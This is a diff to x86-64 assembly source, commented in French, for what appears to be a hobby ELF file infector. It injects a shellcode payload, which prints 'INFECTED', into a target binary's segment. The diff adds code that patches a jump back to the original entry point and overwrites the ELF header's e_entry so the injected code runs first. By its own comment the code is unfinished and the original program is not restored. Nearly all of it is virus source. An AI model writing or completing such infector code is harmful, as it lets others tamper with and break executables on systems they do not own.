@@ -12,9 +12,9 @@ section .data
     buffer_size equ 20    
 
 	payload db 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
-  			db 0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x09, 0x00, 0x00, 0x00, 0x0f, 0x05,
-  			db 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05, 0x00, 0x00,
-			db 0x49, 0x4e, 0x46, 0x45, 0x43, 0x54, 0x45, 0x44, 0x0a    
+            db 0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x09, 0x00, 0x00, 0x00, 0x0f, 0x05,
+            db 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05, 0xeb, 0x00,
+            db 0x49, 0x4e, 0x46, 0x45, 0x43, 0x54, 0x45, 0x44, 0x0a
 	payload_size equ $ - payload
 
  
@@ -90,7 +90,7 @@ _start:
 	; --- Lecture des Program Headers ---
     movzx rcx, word [elf_header + 0x38] ; Offset e_phnum : nombre de Program Headers
     xor rbx, rbx                        ; Initialiser l'index à 0
- 
+
 programm_header_loop:
     ; Condition pour quitter la boucle
     cmp rbx, rcx         
@@ -143,13 +143,23 @@ programm_header_loop:
 	; --- --- Injection de code --- ---
 	; ----------------------------------------------------------------------------
 
-	; L'INFECTION FONCTIONNE MAIS LE CODE N'EST PAS EXECUTEE
+	; ! CODE INFECTIEUX EXECUTEE MAIS CODE ORIGINAL NON RESTAURE ! 
 	; Récupération de l'adresse virtuelle
 	mov rax, qword [programm_header + 16] ; p_vaddr
-	mov [injection_address], rax    
+    mov [injection_address], rax          ; Stocker p_vaddr
 
-	mov rax, qword [programm_header + 8] ; p_offset
-	mov rsi, rax                        ; Offset pour l’injection
+    mov rax, qword [programm_header + 8] ; p_offset
+    mov rsi, rax                         ; Stocker p_offset dans RSI (pour le calcul)
+
+    ; ? AJOUT DE L'ADRESSE DE SAUT ORIGINAL A LA FIN DU PAYLOAD POUR EXECUTEE LE CODE ORIGINEL
+    ; Calcul de l'adresse de saut relative : original_entry_point - (p_vaddr + offset_saut)
+    mov rax, [original_entry_point]     ; Charger le point d'entrée original
+    mov rbx, [injection_address]        ; Charger l'adresse virtuelle où le payload est injecté
+    add rbx, 35                         ; Ajouter l'offset (position après le jmp, 35 octets)
+    sub rax, rbx                        ; Calculer la différence pour obtenir le saut relatif
+
+    mov dword [payload + 18], eax       ; Écrire l'adresse relative de saut dans le payload
+
 
 	mov rdi, [fd]          ; Descripteur de fichier
 	mov rax, 8             ; Syscall: lseek
@@ -162,8 +172,22 @@ programm_header_loop:
 	syscall
 
 	; changer le curseur de e_entry sur le début du infected
-	; remettre le curseur 
+	; --- Modification de e_entry ---
+	mov rdi, [fd]                    ; Descripteur de fichier
+	mov rax, 8                       ; Syscall: lseek
+	mov rsi, 24                      ; Offset d'e_entry dans l'en-tête ELF
+	xor rdx, rdx                     ; Déplacement relatif (début du fichier)
+	syscall
 
+	mov rax, 1                       ; Syscall: write
+	mov rdi, [fd]                    ; Descripteur de fichier
+	mov rsi, injection_address       ; Adresse virtuelle injectée (p_vaddr)
+	mov rdx, 8                       ; Taille (64 bits)
+	syscall
+
+    lea rdi, [msg_injected]
+    call print_message
+    
     jmp exit_loop        
 
 ; -------------------------------------------------------------------------------------------
@@ -200,17 +224,7 @@ exit:
 	mov rdi, [fd]
 	mov rax, 3
 	syscall
-    
-	; Calculer la longueur en soustrayant l'adresse de début de l'adresse de fin+1
-	mov rdx, number_buffer
-	add rdx, buffer_size
-	sub rdx, rbx       	; Calculer la longueur de la chaîne
-    
-	mov rax, 1
-	mov rdi, 1
-	mov rsi, rbx      	 
-	syscall
- 
+     
 	mov rax, 60
 	xor rdi, rdi
 	syscall
